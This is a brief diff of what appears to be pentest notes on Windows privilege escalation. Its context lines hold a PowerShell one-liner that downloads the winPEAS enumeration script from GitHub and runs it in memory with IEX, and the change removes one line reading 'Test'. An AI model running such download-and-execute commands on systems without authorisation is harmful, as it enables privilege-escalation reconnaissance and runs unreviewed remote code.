@@ -37,4 +37,3 @@ Priv Esc.
 ```powershell
 powershell "IEX(New-Object Net.WebClient).downloadString('https://raw.githubusercontent.com/peass-ng/PEASS-ng/master/winPEAS/winPEASps1/winPEAS.ps1')"
 ```
- Test
